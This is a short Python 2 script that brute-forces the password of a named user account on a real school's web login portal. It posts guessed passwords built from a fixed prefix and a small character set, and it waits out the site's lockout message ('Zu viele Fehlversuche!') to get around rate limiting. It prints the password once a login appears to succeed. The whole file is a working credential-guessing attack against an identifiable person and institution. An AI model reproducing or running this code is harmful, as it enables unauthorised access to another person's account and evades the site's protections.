#!/usr/bin/python
import cookielib
import urllib
import urllib2
import itertools
import time

proxy = urllib2.ProxyHandler({'http': '192.168.0.26:8118'})
opener = urllib2.build_opener(proxy)
urllib2.install_opener(opener)
authentication_url = 'https://goethe-schule-harburg.de/idesk/'

def login(passwd):
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

	#opener.addheaders = [('User-agent', 'RedditTesting')]
	user = 'patrick.zierahn'
	urllib2.install_opener(opener)

	payload = {
	  'login_act': 'patrick.zierahn',
	  'login_pwd': passwd
	  }

	data = urllib.urlencode(payload)
	req = urllib2.Request(authentication_url, data)

	resp = urllib2.urlopen(req)
	contents = resp.read()
	return contents

def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(maxlength, maxlength + 1)))

last = ""
for i in list(bruteforce('213ab', 4)):
	print "check -->", "blabl" + i
	log = login("blabl" + i)
#	for x in log:
	
	if "Zu viele Fehlversuche!" in log:
		while("Zu viele Fehlversuche!" in login("blabl" + i)):
			print "Gesperrt"
			time.sleep(300)

	if "Zu viele Fehlversuche!" not in log and "Anmeldung fehlgeschlagen!" not in log:
		print "password -->", "\033[91m%s\033[0m" % ("blabl" + i)
		exit()
		
		
		
		
		
		
		
		
		
		